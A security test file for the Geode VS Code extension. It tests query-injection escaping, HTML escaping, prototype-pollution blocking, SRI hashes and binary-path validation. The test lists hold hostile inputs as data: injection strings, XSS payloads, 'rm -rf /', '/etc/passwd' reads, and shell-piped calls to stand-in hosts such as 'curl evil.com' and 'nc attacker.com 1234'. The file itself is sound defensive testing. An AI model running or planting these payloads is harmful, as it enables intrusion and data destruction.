/**
 * Security Tests for Geode VS Code Extension
 *
 * These tests verify the security fixes implemented for:
 * - GQL Injection prevention (#24, #25)
 * - XSS prevention (#26)
 * - Prototype pollution prevention (#28)
 * - SRI hash validation (#27)
 *
 * @security These tests are critical for verifying the integrity
 * of security controls and MUST pass before any release.
 */

import * as assert from 'assert';

describe('Security Tests', () => {

    describe('GQL Injection Prevention', () => {

        // Test sanitizeIdentifier pattern
        describe('Identifier Sanitization', () => {
            // Pattern: alphanumeric + underscores, must start with letter or underscore
            const identifierPattern = /^[a-zA-Z_][a-zA-Z0-9_]*$/;

            it('accepts valid GQL identifiers', () => {
                const validIdentifiers = [
                    'Person',
                    'KNOWS',
                    'User_Account',
                    '_private',
                    'Node123',
                    'A',
                    '__internal'
                ];

                for (const id of validIdentifiers) {
                    assert.strictEqual(identifierPattern.test(id), true,
                        `"${id}" should be a valid identifier`);
                }
            });

            it('rejects GQL injection attempts', () => {
                const injectionAttempts = [
                    'Person) DETACH DELETE (n)//',
                    'KNOWS]->(x) DETACH DELETE x//',
                    "User' OR '1'='1",
                    'Node; DROP TABLE users;--',
                    '$(rm -rf /)',
                    '<script>alert(1)</script>',
                    '../../../etc/passwd',
                    'a\x00b', // null byte
                    'test\ntest', // newline
                    'test\ttest', // tab
                    '123StartWithNumber',
                    '-hyphen',
                    'space in name',
                    'dot.in.name',
                    ''
                ];

                for (const attempt of injectionAttempts) {
                    assert.strictEqual(identifierPattern.test(attempt), false,
                        `"${attempt}" should be rejected as injection attempt`);
                }
            });

            it('enforces maximum identifier length', () => {
                const MAX_IDENTIFIER_LENGTH = 128;
                const longIdentifier = 'A'.repeat(MAX_IDENTIFIER_LENGTH + 1);
                assert.strictEqual(longIdentifier.length > MAX_IDENTIFIER_LENGTH, true);
            });
        });

        describe('String Value Escaping', () => {
            // Helper that mirrors the actual escapeStringValue function
            function escapeStringValue(value: string): string {
                if (value === null || value === undefined) {
                    return '';
                }
                const strValue = String(value);
                return strValue.replace(/\\/g, '\\\\').replace(/'/g, "''");
            }

            it('escapes single quotes', () => {
                const input = "O'Brien";
                const escaped = escapeStringValue(input);
                assert.strictEqual(escaped, "O''Brien");
            });

            it('escapes backslashes', () => {
                const input = 'path\\to\\file';
                const escaped = escapeStringValue(input);
                assert.strictEqual(escaped, 'path\\\\to\\\\file');
            });

            it('handles GQL injection in string values', () => {
                const injectionAttempts = [
                    ["'; DETACH DELETE (n)//", "''; DETACH DELETE (n)//"],
                    ["test' OR '1'='1", "test'' OR ''1''=''1"],
                    ["\\'; DROP--", "\\\\''; DROP--"]
                ];

                for (const [input, expected] of injectionAttempts) {
                    const escaped = escapeStringValue(input);
                    assert.strictEqual(escaped, expected,
                        `Escaping "${input}" should produce "${expected}"`);
                }
            });

            it('handles empty and null values safely', () => {
                assert.strictEqual(escapeStringValue(''), '');
                assert.strictEqual(escapeStringValue(null as any), '');
                assert.strictEqual(escapeStringValue(undefined as any), '');
            });
        });

        describe('Depth Parameter Bounds', () => {
            function sanitizeDepth(value: number): number {
                const MAX_DEPTH = 20;
                if (typeof value !== 'number' || isNaN(value)) {
                    return 5;
                }
                return Math.max(1, Math.min(Math.floor(value), MAX_DEPTH));
            }

            it('clamps depth to valid range', () => {
                assert.strictEqual(sanitizeDepth(5), 5);
                assert.strictEqual(sanitizeDepth(1), 1);
                assert.strictEqual(sanitizeDepth(20), 20);
            });

            it('rejects values above maximum', () => {
                assert.strictEqual(sanitizeDepth(100), 20);
                assert.strictEqual(sanitizeDepth(Infinity), 20);
            });

            it('rejects values below minimum', () => {
                assert.strictEqual(sanitizeDepth(0), 1);
                assert.strictEqual(sanitizeDepth(-5), 1);
                assert.strictEqual(sanitizeDepth(-Infinity), 1);
            });

            it('handles invalid types', () => {
                assert.strictEqual(sanitizeDepth(NaN), 5);
                assert.strictEqual(sanitizeDepth('5' as any), 5); // Falls through to NaN check
            });
        });
    });

    describe('XSS Prevention', () => {
        // Helper that mirrors the actual escapeHtml function
        function escapeHtml(text: string): string {
            if (text === null || text === undefined) {
                return '';
            }
            return String(text)
                .replace(/&/g, '&amp;')
                .replace(/</g, '&lt;')
                .replace(/>/g, '&gt;')
                .replace(/"/g, '&quot;')
                .replace(/'/g, '&#x27;');
        }

        it('escapes HTML special characters', () => {
            const testCases = [
                ['<script>alert(1)</script>', '&lt;script&gt;alert(1)&lt;/script&gt;'],
                ['<img src=x onerror=alert(1)>', '&lt;img src=x onerror=alert(1)&gt;'],
                ['"onclick="alert(1)"', '&quot;onclick=&quot;alert(1)&quot;'],
                ["'onmouseover='alert(1)'", '&#x27;onmouseover=&#x27;alert(1)&#x27;'],
                ['Tom & Jerry', 'Tom &amp; Jerry'],
                ['<div class="test">', '&lt;div class=&quot;test&quot;&gt;']
            ];

            for (const [input, expected] of testCases) {
                const escaped = escapeHtml(input);
                assert.strictEqual(escaped, expected,
                    `Escaping "${input}" should produce "${expected}"`);
            }
        });

        it('handles null and undefined safely', () => {
            assert.strictEqual(escapeHtml(null as any), '');
            assert.strictEqual(escapeHtml(undefined as any), '');
        });

        it('does not double-escape already escaped content', () => {
            const alreadyEscaped = '&lt;script&gt;';
            const result = escapeHtml(alreadyEscaped);
            // Should escape the & in &lt; to &amp;
            assert.strictEqual(result, '&amp;lt;script&amp;gt;');
        });

        it('handles complex XSS payloads', () => {
            const payloads = [
                '<svg/onload=alert(1)>',
                '<iframe src="javascript:alert(1)">',
                '"><script>alert(String.fromCharCode(88,83,83))</script>',
                '<body onload=alert(1)>',
                '<input onfocus=alert(1) autofocus>',
                '{{constructor.constructor("alert(1)")()}}' // Template injection
            ];

            for (const payload of payloads) {
                const escaped = escapeHtml(payload);
                // Verify no unescaped < or > remain
                assert.strictEqual(escaped.includes('<'), false,
                    `Escaped output should not contain raw <`);
                assert.strictEqual(escaped.includes('>'), false,
                    `Escaped output should not contain raw >`);
            }
        });
    });

    describe('Prototype Pollution Prevention', () => {
        // Helper that mirrors the actual safeMerge function
        function safeMerge<T extends object>(target: T, source: Partial<T>): T {
            const dangerousKeys = ['__proto__', 'constructor', 'prototype'];

            if (!source || typeof source !== 'object') {
                return target;
            }

            for (const key of Object.keys(source)) {
                if (!dangerousKeys.includes(key) && Object.prototype.hasOwnProperty.call(source, key)) {
                    const value = (source as any)[key];
                    if (value !== undefined) {
                        (target as any)[key] = value;
                    }
                }
            }

            return target;
        }

        it('merges safe properties normally', () => {
            const target = { name: 'test', port: 3141 };
            const source = { name: 'updated', host: 'localhost' };
            const result = safeMerge(target, source as any);

            assert.strictEqual(result.name, 'updated');
            assert.strictEqual((result as any).host, 'localhost');
            assert.strictEqual(result.port, 3141);
        });

        it('blocks __proto__ pollution', () => {
            const target = { name: 'test' };
            const maliciousSource = JSON.parse('{"__proto__": {"isAdmin": true}}');

            safeMerge(target, maliciousSource);

            // Verify Object.prototype was not polluted
            assert.strictEqual(({} as any).isAdmin, undefined,
                'Object.prototype should not be polluted with isAdmin');
        });

        it('blocks constructor pollution', () => {
            const target = { name: 'test' };
            const maliciousSource = { constructor: { isAdmin: true } } as any;

            safeMerge(target, maliciousSource);

            // Verify target.constructor wasn't modified
            assert.strictEqual(target.constructor, Object,
                'target.constructor should remain Object');
        });

        it('blocks prototype pollution', () => {
            const target = { name: 'test' };
            const maliciousSource = { prototype: { isAdmin: true } } as any;

            safeMerge(target, maliciousSource);

            assert.strictEqual((target as any).prototype, undefined,
                'prototype property should not be added');
        });

        it('handles null/undefined source safely', () => {
            const target = { name: 'test' };

            assert.doesNotThrow(() => safeMerge(target, null as any));
            assert.doesNotThrow(() => safeMerge(target, undefined as any));
            assert.strictEqual(target.name, 'test');
        });
    });

    describe('Subresource Integrity (SRI)', () => {
        // These are the actual SRI hashes used in GraphVisualizationPanel.ts
        const expectedSRIHashes = {
            'cytoscape@3.28.1': 'sha384-J7Q85oZE4GJ/e7+n2aOQsLXfDwwfnA8S2nZAL5BpFsfpCF84zQD7LroZ/dMnLgex',
            'dagre@0.8.5': 'sha384-2IH3T69EIKYC4c+RXZifZRvaH5SRUdacJW7j6HtE5rQbvLhKKdawxq6vpIzJ7j9M',
            'cytoscape-dagre@2.5.0': 'sha384-u69h9ebXeSjlg6q/rb1zKTRAGu/h8deCl0409xpS/QJctMKnc4M9Fzkm01VOQdeF',
            'cytoscape-cose-bilkent@4.1.0': 'sha384-CUkVnmwscI7lsYn26xHp4BmwwUaqCgfQlIkPoERUBcg8k0xFypHQjzlS8RuYuooO'
        };

        it('SRI hashes are valid SHA-384 format', () => {
            const sha384Pattern = /^sha384-[A-Za-z0-9+/]{64}$/;

            for (const [pkg, hash] of Object.entries(expectedSRIHashes)) {
                assert.strictEqual(sha384Pattern.test(hash), true,
                    `SRI hash for ${pkg} should be valid SHA-384 format`);
            }
        });

        it('all required packages have SRI hashes defined', () => {
            const requiredPackages = [
                'cytoscape@3.28.1',
                'dagre@0.8.5',
                'cytoscape-dagre@2.5.0',
                'cytoscape-cose-bilkent@4.1.0'
            ];

            for (const pkg of requiredPackages) {
                assert.strictEqual(pkg in expectedSRIHashes, true,
                    `SRI hash should be defined for ${pkg}`);
            }
        });
    });

    describe('Content Security Policy', () => {
        it('CSP uses nonce for scripts', () => {
            // The CSP pattern used in the extension
            // Verify nonce pattern is 32 chars alphanumeric
            const noncePattern = /^[A-Za-z0-9]{32}$/;
            assert.strictEqual(noncePattern.test('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdef'), true);
        });

        it('CSP uses nonce for styles', () => {
            // The CSP should include style-src with nonce
            const cspStylePattern = /style-src 'nonce-[A-Za-z0-9]{32}'/;

            // This is the expected pattern in the generated HTML
            const exampleCSP = "style-src 'nonce-abc123def456789012345678901234'";
            assert.ok(cspStylePattern.test(exampleCSP) || exampleCSP.includes("style-src 'nonce-"));
        });
    });

    describe('Binary Path Validation', () => {
        /**
         * SECURITY: Test that the binary path validation correctly identifies
         * suspicious paths that could be used for malicious workspace attacks.
         */

        // Helper that mirrors isValidBinaryPath() from extension.ts
        function isValidBinaryPath(binaryPath: string): boolean {
            const suspiciousPatterns = [
                /[;&|`$]/, // Shell metacharacters
                /\.\.[\/\\]/, // Path traversal
                /^(sh|bash|zsh|cmd|powershell)/i, // Direct shell execution
            ];

            const basename = binaryPath.split(/[\/\\]/).pop()?.toLowerCase() || '';
            const validNames = ['geode', 'geode.exe', 'geode.sh', 'geode.bat'];
            if (validNames.includes(basename)) {
                for (const pattern of suspiciousPatterns.slice(0, 2)) {
                    if (pattern.test(binaryPath)) {
                        return false;
                    }
                }
                return true;
            }

            if (/\.(sh|bat|cmd|ps1)$/i.test(binaryPath)) {
                return false;
            }

            for (const pattern of suspiciousPatterns) {
                if (pattern.test(binaryPath)) {
                    return false;
                }
            }

            return true;
        }

        it('SECURITY: accepts legitimate geode binary paths', () => {
            const validPaths = [
                'geode',
                '/usr/bin/geode',
                '/usr/local/bin/geode',
                'C:\\Program Files\\Geode\\geode.exe',
                './zig-out/bin/geode',
                '/home/user/geode',
                'geode.exe',
                'geode.sh',
                'geode.bat'
            ];

            for (const pathStr of validPaths) {
                assert.strictEqual(isValidBinaryPath(pathStr), true,
                    `Path "${pathStr}" should be valid`);
            }
        });

        it('SECURITY: rejects paths with shell metacharacters', () => {
            const maliciousPaths = [
                '/tmp/geode; rm -rf /',
                'geode && evil',
                'geode | cat /etc/passwd',
                'geode `whoami`',
                '$(evil)',
                '/path/to/geode; whoami'
            ];

            for (const pathStr of maliciousPaths) {
                assert.strictEqual(isValidBinaryPath(pathStr), false,
                    `Path "${pathStr}" should be rejected (shell metacharacters)`);
            }
        });

        it('SECURITY: rejects path traversal attempts', () => {
            const traversalPaths = [
                '../../../etc/passwd',
                '..\\..\\Windows\\System32\\cmd.exe',
                '/tmp/../../../evil',
            ];

            for (const pathStr of traversalPaths) {
                assert.strictEqual(isValidBinaryPath(pathStr), false,
                    `Path "${pathStr}" should be rejected (path traversal)`);
            }
        });

        it('SECURITY: rejects direct shell execution', () => {
            const shellPaths = [
                'sh',
                'bash',
                'zsh',
                'cmd',
                'powershell',
                'Bash',
                'CMD.EXE'
            ];

            for (const pathStr of shellPaths) {
                assert.strictEqual(isValidBinaryPath(pathStr), false,
                    `Path "${pathStr}" should be rejected (direct shell)`);
            }
        });

        it('SECURITY: rejects non-geode script files', () => {
            const scriptPaths = [
                '/tmp/malware.sh',
                'evil.bat',
                'attack.cmd',
                'payload.ps1'
            ];

            for (const pathStr of scriptPaths) {
                assert.strictEqual(isValidBinaryPath(pathStr), false,
                    `Path "${pathStr}" should be rejected (non-geode script)`);
            }
        });
    });

    describe('Password Security', () => {
        /**
         * SECURITY: Verify that the secure password handling pattern is correct.
         * Passwords should NEVER be passed via CLI arguments (visible in ps aux).
         * Instead, they should be passed via environment variables.
         */

        // Helper that mirrors the secure pattern in the codebase
        function buildSecureCLIArgs(
            host: string,
            port: number,
            insecure: boolean,
            username?: string
        ): string[] {
            const args = ['query', '--format', 'json', '--server', `${host}:${port}`];
            if (insecure) {
                args.push('--insecure');
            }
            if (username) {
                args.push('-U', username);
            }
            // SECURITY: Password is NOT added to args
            args.push('-');
            return args;
        }

        function buildPasswordEnvironment(password?: string): Record<string, string | undefined> {
            const env: Record<string, string | undefined> = {};
            if (password) {
                env['GEODE_PASSWORD'] = password;
            }
            return env;
        }

        it('SECURITY: CLI args do not contain -P flag', () => {
            const args = buildSecureCLIArgs('localhost', 3141, false, 'admin');

            assert.strictEqual(args.indexOf('-P'), -1,
                'CLI args should not contain -P flag');
        });

        it('SECURITY: password is not visible in CLI args string', () => {
            const args = buildSecureCLIArgs('localhost', 3141, false, 'admin');
            const argsString = args.join(' ');

            // Common passwords that should never appear in CLI args
            const testPasswords = ['password', 'secret', '12345', 'admin123'];
            for (const pwd of testPasswords) {
                assert.ok(!argsString.includes(pwd),
                    `CLI args should not contain password: ${pwd}`);
            }
        });

        it('SECURITY: password is passed via GEODE_PASSWORD env var', () => {
            const env = buildPasswordEnvironment('mySecretPassword');

            assert.strictEqual(env['GEODE_PASSWORD'], 'mySecretPassword',
                'Password should be set in GEODE_PASSWORD env var');
        });

        it('SECURITY: empty password results in no env var', () => {
            const env = buildPasswordEnvironment(undefined);

            assert.strictEqual(env['GEODE_PASSWORD'], undefined,
                'No GEODE_PASSWORD when password is undefined');
        });

        it('SECURITY: empty string password results in no env var', () => {
            const env = buildPasswordEnvironment('');

            // Empty string is falsy, so it should not set the env var
            assert.ok(!env['GEODE_PASSWORD'] || env['GEODE_PASSWORD'] === '',
                'Empty password should not be set or be empty');
        });
    });

    describe('Schema Explorer Binary Path Validation', () => {
        /**
         * SECURITY: Issue #29 - SchemaExplorerProvider must validate binary paths
         * to prevent untrusted workspace binary execution
         */
        const isValidBinaryPath = (binaryPath: string): boolean => {
            // Normalize path separators for consistent checking across platforms
            const normalizedPath = binaryPath.replace(/\\/g, '/');

            const suspiciousPatterns = [
                /[;&|`$]/, // Shell metacharacters
                /\.\.\//, // Path traversal (normalized to forward slash)
            ];

            // Check for shell metacharacters and path traversal first
            for (const pattern of suspiciousPatterns) {
                if (pattern.test(normalizedPath)) {
                    return false;
                }
            }

            // Extract basename from normalized path for cross-platform compatibility
            const parts = normalizedPath.split('/');
            const basename = parts[parts.length - 1].toLowerCase();

            // Reject direct shell execution attempts
            const shellExecutables = ['sh', 'bash', 'zsh', 'cmd', 'cmd.exe', 'powershell', 'powershell.exe'];
            if (shellExecutables.includes(basename)) {
                return false;
            }

            const validNames = ['geode', 'geode.exe', 'geode.sh', 'geode.bat'];
            if (validNames.includes(basename)) {
                return true;
            }

            // Reject non-geode script extensions
            if (/\.(sh|bat|cmd|ps1)$/i.test(basename)) {
                return false;
            }

            return true;
        };

        it('SECURITY: accepts legitimate geode binary paths', () => {
            const validPaths = [
                'geode',
                '/usr/bin/geode',
                '/usr/local/bin/geode',
                'C:\\Program Files\\Geode\\geode.exe',
                '/home/user/.local/bin/geode'
            ];

            for (const path of validPaths) {
                assert.strictEqual(isValidBinaryPath(path), true,
                    `Should accept valid path: ${path}`);
            }
        });

        it('SECURITY: rejects paths with shell metacharacters', () => {
            const maliciousPaths = [
                'geode; rm -rf /',
                'geode && curl evil.com',
                'geode | nc attacker.com 1234',
                'geode`whoami`',
                'geode$EVIL'
            ];

            for (const path of maliciousPaths) {
                assert.strictEqual(isValidBinaryPath(path), false,
                    `Should reject malicious path: ${path}`);
            }
        });

        it('SECURITY: rejects path traversal attempts', () => {
            const traversalPaths = [
                '../../../bin/sh',
                '..\\..\\..\\System32\\cmd.exe',
                '/usr/bin/../../etc/passwd'
            ];

            for (const path of traversalPaths) {
                assert.strictEqual(isValidBinaryPath(path), false,
                    `Should reject path traversal: ${path}`);
            }
        });

        it('SECURITY: rejects direct shell execution', () => {
            const shellPaths = [
                'sh',
                'bash',
                '/bin/bash',
                'cmd.exe',
                'powershell.exe'
            ];

            for (const path of shellPaths) {
                assert.strictEqual(isValidBinaryPath(path), false,
                    `Should reject shell execution: ${path}`);
            }
        });

        it('SECURITY: rejects non-geode script files', () => {
            const scriptPaths = [
                'malicious.sh',
                'evil.bat',
                'backdoor.cmd',
                '/tmp/exploit.ps1'
            ];

            for (const path of scriptPaths) {
                assert.strictEqual(isValidBinaryPath(path), false,
                    `Should reject non-geode script: ${path}`);
            }
        });

        it('SECURITY: allows geode wrapper scripts', () => {
            const wrapperPaths = [
                '/usr/local/bin/geode.sh',
                'C:\\tools\\geode.bat',
                '/opt/geode/geode.sh'
            ];

            for (const path of wrapperPaths) {
                assert.strictEqual(isValidBinaryPath(path), true,
                    `Should allow geode wrapper: ${path}`);
            }
        });
    });
});
